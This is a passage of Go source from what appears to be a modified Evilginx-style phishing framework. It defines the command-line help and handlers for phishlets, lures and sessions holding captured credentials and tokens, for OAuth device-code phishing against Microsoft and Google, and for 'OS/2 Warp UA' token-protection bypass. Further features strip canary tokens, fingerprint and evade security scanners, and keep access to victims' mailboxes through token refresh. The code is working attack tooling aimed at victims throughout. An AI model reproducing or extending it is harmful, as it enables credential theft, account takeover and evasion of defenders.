			t.output("  %-20s %v\n", "Uptime:", stats.Uptime.Round(time.Second))
			t.output("  %-20s %d\n", "Active connections:", stats.ActiveConns)
			t.output("  %-20s %d\n", "Total connections:", stats.TotalConns)
			t.output("  %-20s %d\n", "Failed connections:", stats.FailedConns)
			if stats.TotalConns > 0 {
				successRate := float64(stats.TotalConns-stats.FailedConns) / float64(stats.TotalConns) * 100
				t.output("  %-20s %.1f%%\n", "Success rate:", successRate)
			}
			t.output("  %-20s %s\n\n", "Last connection:", stats.LastConnTime.Format("2006-01-02 15:04:05"))
		}
		return nil

	case "bypass":
		if pn == 2 {
			log.Info("[devicecode] using OS/2 Warp UA for token protection bypass...")
			err := t.p.deviceCode.RequestTokenWithBypassUA(args[1])
			if err != nil {
				return err
			}
			return nil
		}

	case "delete":
		if pn == 2 {
			if args[1] == "all" {
				count := t.p.deviceCode.DeleteAllSessions()
				log.Info("[devicecode] deleted %d sessions", count)
				return nil
			}
			err := t.p.deviceCode.DeleteSession(args[1])
			if err != nil {
				return err
			}
			log.Info("[devicecode] session %s deleted", args[1])
			return nil
		}

	case "clients":
		filterProvider := ""
		if pn >= 2 {
			filterProvider = strings.ToLower(args[1])
		}
		t.output("\n")
		t.output("  %-20s %-8s %-50s %s\n", white.Sprint("Alias"), white.Sprint("Provider"), white.Sprint("Client ID"), white.Sprint("Display Name"))
		t.output("  %-20s %-8s %-50s %s\n", "----", "--------", "---------", "------------")
		for alias, client := range KnownClientIDs {
			if filterProvider != "" && client.Provider != filterProvider {
				continue
			}
			provColor := hiblue
			if client.Provider == DCProviderGoogle {
				provColor = higreen
			}
			t.output("  %-20s %-8s %-50s %s\n", hiblue.Sprint(alias), provColor.Sprint(client.Provider), client.ClientID, client.Name)
		}
		t.output("\n  filter by provider: devicecode clients <microsoft|google>\n\n")
		return nil

	case "scopes":
		filterProvider := ""
		if pn >= 2 {
			filterProvider = strings.ToLower(args[1])
		}
		t.output("\n")
		t.output("  %-15s %-10s %s\n", white.Sprint("Preset"), white.Sprint("Provider"), white.Sprint("Scope"))
		t.output("  %-15s %-10s %s\n", "------", "--------", "-----")
		for name, scope := range ScopePresets {
			provider := DCProviderMicrosoft
			if strings.HasPrefix(name, "g") && name != "minimal" {
				provider = DCProviderGoogle
			}
			if filterProvider != "" && provider != filterProvider {
				continue
			}
			provColor := hiblue
			if provider == DCProviderGoogle {
				provColor = higreen
			}
			t.output("  %-15s %-10s %s\n", hiblue.Sprint(name), provColor.Sprint(provider), scope)
		}
		t.output("\n  filter by provider: devicecode scopes <microsoft|google>\n\n")
		return nil
	}

	_ = hiblue
	_ = higreen
	_ = hiyellow
	_ = hired

	return fmt.Errorf("invalid syntax: devicecode %s", strings.Join(args, " "))
}

func (t *Terminal) monitorLurePause() {
	var pausedLures map[string]int64
	pausedLures = make(map[string]int64)

	for {
		t_cur := time.Now()

		for n, l := range t.cfg.lures {
			if l.PausedUntil > 0 {
				l_id := t.cfg.lureIds[n]
				t_pause := time.Unix(l.PausedUntil, 0)
				if t_pause.After(t_cur) {
					pausedLures[l_id] = l.PausedUntil
				} else {
					if _, ok := pausedLures[l_id]; ok {
						log.Info("[%s] lure (%d) is now active", l.Phishlet, n)
					}
					pausedLures[l_id] = 0
					l.PausedUntil = 0
				}
			}
		}

		time.Sleep(500 * time.Millisecond)
	}
}

func (t *Terminal) createHelp() {
	h, _ := NewHelp()
	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
		readline.PcItem("config", readline.PcItem("server_name"), readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("wildcard_tls", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("randomize_subdomains", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("telegram", readline.PcItem("test")),
			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"))))
	h.AddSubCommand("config", nil, "", "show all configuration variables")
	h.AddSubCommand("config", []string{"server_name"}, "server_name <name>", "set the server name for event notifications")
	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
	h.AddSubCommand("config", []string{"ipv4", "external"}, "ipv4 external <ipv4_address>", "set ipv4 external address of the current server")
	h.AddSubCommand("config", []string{"ipv4", "bind"}, "ipv4 bind <ipv4_address>", "set ipv4 bind address of the current server")
	h.AddSubCommand("config", []string{"unauth_url"}, "unauth_url <url>", "change the url where all unauthorized requests will be redirected to")
	h.AddSubCommand("config", []string{"autocert"}, "autocert <on|off>", "enable or disable the automated certificate retrieval from letsencrypt")
	h.AddSubCommand("config", []string{"wildcard_tls"}, "wildcard_tls <on|off>", "enable or disable wildcard TLS certificates (self-signed fallback if no external DNS)")
	h.AddSubCommand("config", []string{"randomize_subdomains"}, "randomize_subdomains <on|off>", "auto-randomize phish_sub values to evade pattern-based detection (restart to apply)")
	h.AddSubCommand("config", []string{"gophish", "admin_url"}, "gophish admin_url <url>", "set up the admin url of a gophish instance to communicate with (e.g. https://gophish.domain.com:7777)")
	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
	h.AddSubCommand("config", []string{"gophish", "test"}, "gophish test", "test the gophish configuration")
	h.AddSubCommand("config", []string{"telegram"}, "telegram <bot_token> <chat_id>", "set up Telegram notifications (auto-creates notifier with all triggers enabled)")
	h.AddSubCommand("config", []string{"telegram", "test"}, "telegram test", "send a test notification to configured Telegram")

	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
	h.AddSubCommand("proxy", nil, "", "show all configuration variables")
	h.AddSubCommand("proxy", []string{"enable"}, "enable", "enable proxy")
	h.AddSubCommand("proxy", []string{"disable"}, "disable", "disable proxy")
	h.AddSubCommand("proxy", []string{"type"}, "type <type>", "set proxy type: http (default), https, socks5, socks5h")
	h.AddSubCommand("proxy", []string{"address"}, "address <address>", "set proxy address")
	h.AddSubCommand("proxy", []string{"port"}, "port <port>", "set proxy port")
	h.AddSubCommand("proxy", []string{"username"}, "username <username>", "set proxy authentication username")
	h.AddSubCommand("proxy", []string{"password"}, "password <password>", "set proxy authentication password")

	h.AddCommand("phishlets", "general", "manage phishlets configuration", "Shows status of all available phishlets and allows to change their parameters and enabled status.", LAYER_TOP,
		readline.PcItem("phishlets", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("delete", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("hostname", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("enable", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("unauth_url", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("domain", readline.PcItemDynamic(t.phishletPrefixCompleter))))
	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
	h.AddSubCommand("phishlets", nil, "<phishlet>", "show details of a specific phishlets")
	h.AddSubCommand("phishlets", []string{"create"}, "create <phishlet> <child_name> <key1=value1> <key2=value2>", "create child phishlet from a template phishlet with custom parameters")
	h.AddSubCommand("phishlets", []string{"delete"}, "delete <phishlet>", "delete child phishlet")
	h.AddSubCommand("phishlets", []string{"hostname"}, "hostname <phishlet> <hostname>", "set hostname for given phishlet (e.g. this.is.not.a.phishing.site.evilsite.com)")
	h.AddSubCommand("phishlets", []string{"domain"}, "domain <phishlet> <domain>", "set base domain for given phishlet (multi-domain support)")
	h.AddSubCommand("phishlets", []string{"unauth_url"}, "unauth_url <phishlet> <url>", "override global unauth_url just for this phishlet")
	h.AddSubCommand("phishlets", []string{"enable"}, "enable <phishlet>", "enables phishlet and requests ssl/tls certificate if needed")
	h.AddSubCommand("phishlets", []string{"disable"}, "disable <phishlet>", "disables phishlet")
	h.AddSubCommand("phishlets", []string{"hide"}, "hide <phishlet>", "hides the phishing page, logging and redirecting all requests to it (good for avoiding scanners when sending out phishing links)")
	h.AddSubCommand("phishlets", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")

	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))))
	h.AddSubCommand("sessions", nil, "", "show history of all logged visits and captured credentials")
	h.AddSubCommand("sessions", nil, "<id>", "show session details, including captured authentication tokens, if available")
	h.AddSubCommand("sessions", nil, "<id> portal", "generate a portal URL to extract Microsoft cookies from captured tokens (opens cookie import page)")
	h.AddSubCommand("sessions", nil, "<id> export", "export all captured device code tokens for a session (refresh token, access token, etc.)")
	h.AddSubCommand("sessions", []string{"delete"}, "delete <id>", "delete logged session with <id> (ranges with separators are allowed e.g. 1-7,10-12,15-25)")
	h.AddSubCommand("sessions", []string{"delete", "all"}, "delete all", "delete all logged sessions")

	h.AddCommand("quickstart", "general", "one-command setup wizard", "Configures domain, IP, wildcard TLS, botguard, phishlet, lure, and optionally Telegram notifications in a single command.", LAYER_TOP,
		readline.PcItem("quickstart"))
	h.AddSubCommand("quickstart", nil, "<domain> <phishlet> [bot_token] [chat_id]", "set up everything in one command (e.g. quickstart example.com o365 123:TOKEN 456)")

	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("params"), readline.PcItem("ua_filter"), readline.PcItem("domain"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)),
				readline.PcItem("devicecode", readline.PcItem("off"), readline.PcItem("always"), readline.PcItem("fallback"), readline.PcItem("auto")),
				readline.PcItem("dc_provider", readline.PcItem("microsoft"), readline.PcItem("google")),
				readline.PcItem("dc_client", readline.PcItem("ms_office"), readline.PcItem("ms_teams"), readline.PcItem("azure_cli"), readline.PcItem("ms_outlook"), readline.PcItem("ms_graph"), readline.PcItem("google_cloud_sdk"), readline.PcItem("google_tv"), readline.PcItem("google_device_policy"), readline.PcItem("google_chrome_sync"), readline.PcItem("google_ios")),
				readline.PcItem("dc_scope", readline.PcItem("full"), readline.PcItem("mail"), readline.PcItem("files"), readline.PcItem("user"), readline.PcItem("minimal"), readline.PcItem("gmail"), readline.PcItem("gdrive"), readline.PcItem("gworkspace"), readline.PcItem("gcalendar"), readline.PcItem("gcontacts"), readline.PcItem("gcloud"), readline.PcItem("gprofile"), readline.PcItem("gadmin"), readline.PcItem("gall")),
				readline.PcItem("dc_template", readline.PcItem("success"), readline.PcItem("fallback"), readline.PcItem("compliance")),
				readline.PcItem("dc_theme", readline.PcItem("default"), readline.PcItem("onedrive"), readline.PcItem("authenticator"), readline.PcItem("adobe"), readline.PcItem("docusign"), readline.PcItem("sharepoint")))),
			readline.PcItem("delete", readline.PcItem("all"))))

	h.AddSubCommand("lures", nil, "", "show all create lures")
	h.AddSubCommand("lures", nil, "<id>", "show details of a lure with a given <id>")
	h.AddSubCommand("lures", []string{"create"}, "create <phishlet>", "creates new lure for given <phishlet>")
	h.AddSubCommand("lures", []string{"delete"}, "delete <id>", "deletes lure with given <id>")
	h.AddSubCommand("lures", []string{"delete", "all"}, "delete all", "deletes all created lures")
	h.AddSubCommand("lures", []string{"get-url"}, "get-url <id> <key1=value1> <key2=value2>", "generates a phishing url for a lure with a given <id>, with optional parameters")
	h.AddSubCommand("lures", []string{"get-url"}, "get-url <id> import <params_file> export <urls_file> <text|csv|json>", "generates phishing urls, importing parameters from <import_path> file and exporting them to <export_path>")
	h.AddSubCommand("lures", []string{"pause"}, "pause <id> <1d2h3m4s>", "pause lure <id> for specific amount of time and redirect visitors to `unauth_url`")
	h.AddSubCommand("lures", []string{"unpause"}, "unpause <id>", "unpause lure <id> and make it available again")
	h.AddSubCommand("lures", []string{"edit", "hostname"}, "edit <id> hostname <hostname>", "sets custom phishing <hostname> for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "path"}, "edit <id> path <path>", "sets custom url <path> for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "domain"}, "edit <id> domain <domain>", "sets domain override for a lure (multi-domain support)")
	h.AddSubCommand("lures", []string{"edit", "redirector"}, "edit <id> redirector <path>", "sets an html redirector directory <path> for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "ua_filter"}, "edit <id> ua_filter <regexp>", "sets a regular expression user-agent whitelist filter <regexp> for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "redirect_url"}, "edit <id> redirect_url <redirect_url>", "sets redirect url that user will be navigated to on successful authorization, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "phishlet"}, "edit <id> phishlet <phishlet>", "change the phishlet, the lure with a given <id> applies to")
	h.AddSubCommand("lures", []string{"edit", "info"}, "edit <id> info <info>", "set personal information to describe a lure with a given <id> (display only)")
	h.AddSubCommand("lures", []string{"edit", "og_title"}, "edit <id> og_title <title>", "sets opengraph title that will be shown in link preview, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "og_desc"}, "edit <id> og_des <title>", "sets opengraph description that will be shown in link preview, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "og_image"}, "edit <id> og_image <title>", "sets opengraph image url that will be shown in link preview, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "og_url"}, "edit <id> og_url <title>", "sets opengraph url that will be shown in link preview, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "devicecode"}, "edit <id> devicecode <off|always|fallback|auto>", "set device code chaining mode (off=disabled, always=double capture, fallback=on AitM failure, auto=smart)")
	h.AddSubCommand("lures", []string{"edit", "dc_provider"}, "edit <id> dc_provider <microsoft|google>", "set device code provider (auto-sets default client and scope)")
	h.AddSubCommand("lures", []string{"edit", "dc_client"}, "edit <id> dc_client <client>", "set OAuth client for device code (ms_office, ms_teams, google_cloud_sdk, google_tv, etc.)")
	h.AddSubCommand("lures", []string{"edit", "dc_scope"}, "edit <id> dc_scope <scope>", "set scope preset (microsoft: full, mail, files | google: gmail, gdrive, gworkspace, gall)")
	h.AddSubCommand("lures", []string{"edit", "dc_template"}, "edit <id> dc_template <template>", "set interstitial template (success, fallback, compliance)")
	h.AddSubCommand("lures", []string{"edit", "dc_theme"}, "edit <id> dc_theme <theme>", "set themed landing page (default, onedrive, authenticator, adobe, docusign, sharepoint)")

	h.AddCommand("blacklist", "general", "manage automatic blacklisting of requesting ip addresses", "Select what kind of requests should result in requesting IP addresses to be blacklisted.", LAYER_TOP,
		readline.PcItem("blacklist", readline.PcItem("all"), readline.PcItem("unauth"), readline.PcItem("noadd"), readline.PcItem("off"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off"))))

	h.AddSubCommand("blacklist", nil, "", "show current blacklisting mode")
	h.AddSubCommand("blacklist", []string{"all"}, "all", "block and blacklist ip addresses for every single request (even authorized ones!)")
	h.AddSubCommand("blacklist", []string{"unauth"}, "unauth", "block and blacklist ip addresses only for unauthorized requests")
	h.AddSubCommand("blacklist", []string{"noadd"}, "noadd", "block but do not add new ip addresses to blacklist")
	h.AddSubCommand("blacklist", []string{"off"}, "off", "ignore blacklist and allow every request to go through")
	h.AddSubCommand("blacklist", []string{"log"}, "log <on|off>", "enable or disable log output for blacklist messages")

	h.AddCommand("canary", "general", "manage canary token stripping in proxied responses", "Strips known blue team canary tokens (canarytokens, burpcollaborator, interactsh, etc.) from HTML/JS responses before they reach the victim's browser. Prevents detection tokens from phoning home.", LAYER_TOP,
		readline.PcItem("canary", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("on"), readline.PcItem("off"), readline.PcItem("list"), readline.PcItem("stats"), readline.PcItem("add")))

	h.AddSubCommand("canary", nil, "", "show current canary stripper status and patterns")
	h.AddSubCommand("canary", []string{"enable"}, "enable", "enable canary token stripping")
	h.AddSubCommand("canary", []string{"disable"}, "disable", "disable canary token stripping")
	h.AddSubCommand("canary", []string{"on"}, "on", "enable canary token stripping")
	h.AddSubCommand("canary", []string{"off"}, "off", "disable canary token stripping")
	h.AddSubCommand("canary", []string{"list"}, "list", "list all active canary patterns")
	h.AddSubCommand("canary", []string{"stats"}, "stats", "show canary stripper statistics")
	h.AddSubCommand("canary", []string{"add"}, "add <regex>", "add a custom regex pattern to strip from responses")

	h.AddCommand("botguard", "general", "manage bot detection and protection", "Configure bot detection using JA4 fingerprinting and browser telemetry to block security scanners. Includes JA4 auto-learning that correlates fingerprints with trust scores to auto-blacklist scanners and auto-whitelist known browsers.", LAYER_TOP,
		readline.PcItem("botguard",
			readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("stats"),
			readline.PcItem("urls"), readline.PcItem("add"), readline.PcItem("remove"), readline.PcItem("clear"),
			readline.PcItem("min_score"), readline.PcItem("whitelist"), readline.PcItem("blacklist"),
			readline.PcItem("learn",
				readline.PcItem("enable"), readline.PcItem("disable"),
				readline.PcItem("threshold"), readline.PcItem("min_obs"),
				readline.PcItem("list"), readline.PcItem("reset"))))

	h.AddSubCommand("botguard", nil, "", "show current botguard configuration and spoof URLs")
	h.AddSubCommand("botguard", []string{"enable"}, "enable", "enable bot detection and protection")
	h.AddSubCommand("botguard", []string{"disable"}, "disable", "disable bot detection and protection")
	h.AddSubCommand("botguard", []string{"stats"}, "stats", "show botguard statistics and trust scores")
	h.AddSubCommand("botguard", []string{"urls"}, "urls", "list all configured spoof URLs")
	h.AddSubCommand("botguard", []string{"add"}, "add <url>", "add a spoof URL (bots will be randomly served content from one of these)")
	h.AddSubCommand("botguard", []string{"remove"}, "remove <url>", "remove a spoof URL from the list")
	h.AddSubCommand("botguard", []string{"clear"}, "clear", "clear all spoof URLs")
	h.AddSubCommand("botguard", []string{"min_score"}, "min_score <0-100>", "set minimum trust score to allow requests (lower = more bot-like)")
	h.AddSubCommand("botguard", []string{"whitelist"}, "whitelist <ja4>", "add a JA4 fingerprint to the whitelist (always allow)")
	h.AddSubCommand("botguard", []string{"blacklist"}, "blacklist <ja4>", "add a JA4 fingerprint to the blacklist (always block)")
	h.AddSubCommand("botguard", []string{"learn"}, "learn", "show JA4 auto-learning status")
	h.AddSubCommand("botguard", []string{"learn", "enable"}, "learn enable", "enable JA4 auto-learning")
	h.AddSubCommand("botguard", []string{"learn", "disable"}, "learn disable", "disable JA4 auto-learning")
	h.AddSubCommand("botguard", []string{"learn", "threshold"}, "learn threshold [<0-100>]", "show or set auto-blacklist threshold (default: 20)")
	h.AddSubCommand("botguard", []string{"learn", "min_obs"}, "learn min_obs [<n>]", "show or set minimum observations before auto-decision (default: 10)")
	h.AddSubCommand("botguard", []string{"learn", "list"}, "learn list", "list all learned JA4 profiles sorted by observations")
	h.AddSubCommand("botguard", []string{"learn", "reset"}, "learn reset", "clear all learned JA4 profiles")

	h.AddCommand("evilpuppet", "general", "manage background browser automation", "Configure EvilPuppet for background browser sessions using chromedp to capture additional tokens via headless browser automation.", LAYER_TOP,
		readline.PcItem("evilpuppet", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("status"),
			readline.PcItem("headless", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("chromium_path"), readline.PcItem("display"), readline.PcItem("timeout"),
			readline.PcItem("debug", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("pool", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("status"), readline.PcItem("size")),
			readline.PcItem("refresh"), readline.PcItem("collect"), readline.PcItem("clear")))

	h.AddSubCommand("evilpuppet", nil, "", "show current evilpuppet configuration and phishlet status")
	h.AddSubCommand("evilpuppet", []string{"enable"}, "enable", "enable background browser automation")
	h.AddSubCommand("evilpuppet", []string{"disable"}, "disable", "disable background browser automation")
	h.AddSubCommand("evilpuppet", []string{"status"}, "status", "show active evilpuppet sessions count")
	h.AddSubCommand("evilpuppet", []string{"headless"}, "headless", "show headless mode")
	h.AddSubCommand("evilpuppet", []string{"headless", "on"}, "headless on", "run browsers in headless mode (no GUI)")
	h.AddSubCommand("evilpuppet", []string{"headless", "off"}, "headless off", "run browsers in headed mode (default, requires X11 display)")
	h.AddSubCommand("evilpuppet", []string{"chromium_path"}, "chromium_path <path>", "set path to chromium/chrome binary (blank for auto-detect)")
	h.AddSubCommand("evilpuppet", []string{"display"}, "display <display>", "set X11 display for headed mode (e.g., :99 for Xvfb)")
	h.AddSubCommand("evilpuppet", []string{"timeout"}, "timeout <seconds>", "set default timeout for browser sessions (5-300)")
	h.AddSubCommand("evilpuppet", []string{"debug"}, "debug <on|off>", "enable or disable chromedp debug logging")
	h.AddSubCommand("evilpuppet", []string{"pool"}, "pool", "show pool status and configuration")
	h.AddSubCommand("evilpuppet", []string{"pool", "enable"}, "pool enable", "enable browser pre-warm pool with headless Chrome instances")
	h.AddSubCommand("evilpuppet", []string{"pool", "disable"}, "pool disable", "disable and clear the browser pool")
	h.AddSubCommand("evilpuppet", []string{"pool", "status"}, "pool status", "show pool status (busy/idle/total)")
	h.AddSubCommand("evilpuppet", []string{"pool", "size"}, "pool size <n>", "set pool size (1-50, default: 5)")
	h.AddSubCommand("evilpuppet", []string{"refresh"}, "refresh <phishlet>", "refresh tokens for a phishlet via the pool")
	h.AddSubCommand("evilpuppet", []string{"collect"}, "collect", "retrieve all completed pool refresh results")
	h.AddSubCommand("evilpuppet", []string{"clear"}, "clear", "kill all pool browsers and clear collected results")

	h.AddCommand("domains", "general", "manage external DNS for phishing domains", "Configure external DNS providers (Cloudflare, DigitalOcean) to manage DNS records automatically. This removes the need for the internal nameserver on UDP 53 and improves stealth.", LAYER_TOP,
		readline.PcItem("domains", readline.PcItem("add"), readline.PcItem("delete"), readline.PcItem("config"), readline.PcItem("list"), readline.PcItem("help")))

	h.AddSubCommand("domains", nil, "", "list all configured domains and their DNS providers")
	h.AddSubCommand("domains", []string{"add"}, "add <domain>", "add a new domain (defaults to internal DNS)")
	h.AddSubCommand("domains", []string{"delete"}, "delete <domain>", "remove a domain from the configuration")
	h.AddSubCommand("domains", []string{"config"}, "config <domain> <provider> [key=value...]", "configure DNS provider for a domain (e.g., cloudflare api_token=xxx)")
	h.AddSubCommand("domains", []string{"list"}, "list <domain>", "list DNS records for a domain from the external provider")
	h.AddSubCommand("domains", []string{"help"}, "help", "show detailed usage examples")

	h.AddCommand("notify", "general", "manage event notifications", "Configure real-time notifications for phishing events via webhook, Slack, Pushover, or Telegram.", LAYER_TOP,
		readline.PcItem("notify", readline.PcItem("create"), readline.PcItem("delete"), readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("view"), readline.PcItem("config",
			readline.PcItem("webhook"), readline.PcItem("slack"), readline.PcItem("pushover"), readline.PcItem("telegram")),
			readline.PcItem("test", readline.PcItem("lure_clicked"), readline.PcItem("lure_landed"), readline.PcItem("credential_captured"), readline.PcItem("session_captured")),
			readline.PcItem("set", readline.PcItem("trigger"), readline.PcItem("template")),
			readline.PcItem("reset"), readline.PcItem("help")))

	h.AddSubCommand("notify", nil, "", "list all configured notifiers")
	h.AddSubCommand("notify", []string{"create"}, "create <name>", "create a new notifier")
	h.AddSubCommand("notify", []string{"delete"}, "delete <name>", "delete a notifier")
	h.AddSubCommand("notify", []string{"enable"}, "enable <name>", "enable a notifier")
	h.AddSubCommand("notify", []string{"disable"}, "disable <name>", "disable a notifier")
	h.AddSubCommand("notify", []string{"view"}, "view <name>", "view notifier configuration and templates")
	h.AddSubCommand("notify", []string{"config"}, "config <name> <channel> [key=value...]", "configure notifier channel (webhook, slack, pushover, telegram)")
	h.AddSubCommand("notify", []string{"test"}, "test <name> <event>", "send a test notification (events: lure_clicked, lure_landed, credential_captured, session_captured)")
	h.AddSubCommand("notify", []string{"set", "trigger"}, "set <name> trigger <event> <enable|disable>", "enable or disable event trigger")
	h.AddSubCommand("notify", []string{"set", "template"}, "set <name> template <event> <subject|body> <value>", "customize notification message template")
	h.AddSubCommand("notify", []string{"reset"}, "reset <name|default>", "reset notifier to defaults or reset default settings")
	h.AddSubCommand("notify", []string{"help"}, "help", "show detailed usage examples")

	h.AddCommand("devicecode", "general", "manage OAuth device code phishing and AitM chaining", "Device code phishing captures OAuth tokens via the legitimate device authorization grant flow. Can be used standalone or chained with AitM reverse proxy for double capture and FIDO2 bypass.", LAYER_TOP,
		readline.PcItem("devicecode",
			readline.PcItem("tenant"),
			readline.PcItem("generate", readline.PcItem("ms_office"), readline.PcItem("ms_teams"), readline.PcItem("azure_cli"), readline.PcItem("ms_outlook"), readline.PcItem("ms_graph"), readline.PcItem("ms_intune"), readline.PcItem("ms_onedrive"), readline.PcItem("ms_sharepoint"), readline.PcItem("ms_auth_broker"), readline.PcItem("ms_authenticator")),
			readline.PcItem("autopoll", readline.PcItem("ms_office"), readline.PcItem("ms_teams"), readline.PcItem("azure_cli"), readline.PcItem("ms_outlook"), readline.PcItem("ms_graph")),
			readline.PcItem("poll"),
			readline.PcItem("tokens"),
			readline.PcItem("userinfo"),
			readline.PcItem("refresh", readline.PcItem("all")),
			readline.PcItem("status"),
			readline.PcItem("bypass"),
			readline.PcItem("delete", readline.PcItem("all")),
			readline.PcItem("clients"),
			readline.PcItem("scopes")))

	h.AddSubCommand("devicecode", nil, "", "show device code session status and active sessions")
	h.AddSubCommand("devicecode", []string{"tenant"}, "tenant <tenant>", "set target tenant (default: common, can be contoso.onmicrosoft.com or tenant GUID)")
	h.AddSubCommand("devicecode", []string{"generate"}, "generate <client> [scope]", "generate a device code (victim must enter manually)")
	h.AddSubCommand("devicecode", []string{"autopoll"}, "autopoll <client> [scope]", "generate device code and start automatic token polling")
	h.AddSubCommand("devicecode", []string{"poll"}, "poll <session_id>", "start polling for tokens on an existing session")
	h.AddSubCommand("devicecode", []string{"tokens"}, "tokens <session_id>", "export captured tokens as JSON")
	h.AddSubCommand("devicecode", []string{"userinfo"}, "userinfo <session_id>", "fetch victim's profile from Microsoft Graph")
	h.AddSubCommand("devicecode", []string{"refresh"}, "refresh <session_id|all>", "refresh access token(s) using refresh token(s)")
	h.AddSubCommand("devicecode", []string{"status"}, "status", "show auto-refresh status and statistics")
	h.AddSubCommand("devicecode", []string{"bypass"}, "bypass <session_id>", "refresh token with OS/2 Warp UA to bypass token protection")
	h.AddSubCommand("devicecode", []string{"delete"}, "delete <session_id>", "delete a device code session")
	h.AddSubCommand("devicecode", []string{"delete", "all"}, "delete all", "delete all device code sessions")
	h.AddSubCommand("devicecode", []string{"clients"}, "clients", "list all known Microsoft OAuth client IDs")
	h.AddSubCommand("devicecode", []string{"scopes"}, "scopes", "list all available scope presets")

	h.AddCommand("test-certs", "general", "test TLS certificates for active phishlets", "Test availability of set up TLS certificates for active phishlets.", LAYER_TOP,
		readline.PcItem("test-certs"))

	h.AddCommand("feed", "general", "manage token feed API for mailbox viewer", "Token feed API serves captured tokens to the mailbox viewer for email access. Accounts auto-sync and tokens are refreshed server-side.", LAYER_TOP,
		readline.PcItem("feed",
			readline.PcItem("key"),
			readline.PcItem("url")))

	h.AddSubCommand("feed", nil, "", "show feed status and accounts")
	h.AddSubCommand("feed", []string{"key"}, "key", "show API key")
	h.AddSubCommand("feed", []string{"url"}, "url", "show full feed URL")

	h.AddCommand("mailbox", "general", "manage persistent mailbox accounts with auto-refresh", "Captured accounts are saved persistently and survive password changes. Tokens are automatically refreshed every 10 minutes. Accounts are stored in mailbox_accounts.json.", LAYER_TOP,
		readline.PcItem("mailbox",
			readline.PcItem("refresh", readline.PcItem("all")),
			readline.PcItem("remove"),
			readline.PcItem("url"),
			readline.PcItem("download"),
			readline.PcItem("stats")))

	h.AddSubCommand("mailbox", nil, "", "list all saved mailbox accounts")
	h.AddSubCommand("mailbox", []string{"refresh"}, "refresh <id|all>", "force refresh token(s)")
	h.AddSubCommand("mailbox", []string{"remove"}, "remove <id>", "remove an account")
	h.AddSubCommand("mailbox", []string{"url"}, "url", "show API endpoint URL")
	h.AddSubCommand("mailbox", []string{"download"}, "download", "show M365-Mail download URL with all captured accounts")
	h.AddSubCommand("mailbox", []string{"stats"}, "stats", "show account statistics")

	h.AddCommand("clear", "general", "clears the screen", "Clears the screen.", LAYER_TOP,
		readline.PcItem("clear"))

